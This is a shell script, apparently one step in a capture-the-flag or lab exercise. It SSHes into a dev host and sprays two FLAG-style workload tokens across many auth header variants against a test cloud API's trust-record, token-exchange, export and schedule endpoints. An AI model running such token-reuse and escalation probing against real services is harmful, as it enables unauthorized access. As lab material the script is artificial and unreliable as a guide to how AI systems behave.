set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
C=https://cloud-api.keplerops.test
W1="FLAG{adfbabdcdaca98ac}"
W2="FLAG{6bb66074f2325405}"
p(){ echo "-- $1"; shift; curl -sSk -m 8 -w '\n[%{http_code}]\n' "$@" | head -c 900; }
for W in "$W1" "$W2"; do
 echo "############ TOKEN ${W:0:12}"
 for h in "X-Workload-Token" "X-Fieldkest-Workload-Token" "Workload-Token" "X-Workload" "X-Workload-Identity"; do
  p "TR-1 [$h bare]" -H "$h: $W" "$C/api/trust-records/TR-1"
 done
 for a in "Workload $W" "Bearer $W" "Workload-Token $W" "Token $W"; do
  p "TR-1 [Auth: $a]" -H "Authorization: $a" "$C/api/trust-records/TR-1"
 done
 p "workspace exchange GET Auth Workload" -H "Authorization: Workload $W" "$C/api/workspaces/current/token-exchange"
 p "workspace exchange POST Auth Workload" -X POST -H "Authorization: Workload $W" -H 'Content-Type: application/json' -d '{}' "$C/api/workspaces/current/token-exchange"
 p "exports EXP-2841 X-Workload-Token" -H "X-Workload-Token: $W" "$C/api/exports/EXP-2841"
 p "exports def X-Workload-Token" -H "X-Workload-Token: $W" "$C/api/exports/EXP-2841/definition"
 p "schedule X-Workload-Token" -H "X-Workload-Token: $W" "$C/api/schedules/SCHED-2841"
 p "schedule Auth Workload" -H "Authorization: Workload $W" "$C/api/schedules/SCHED-2841"
done
RSH
echo DONE_K14_R24
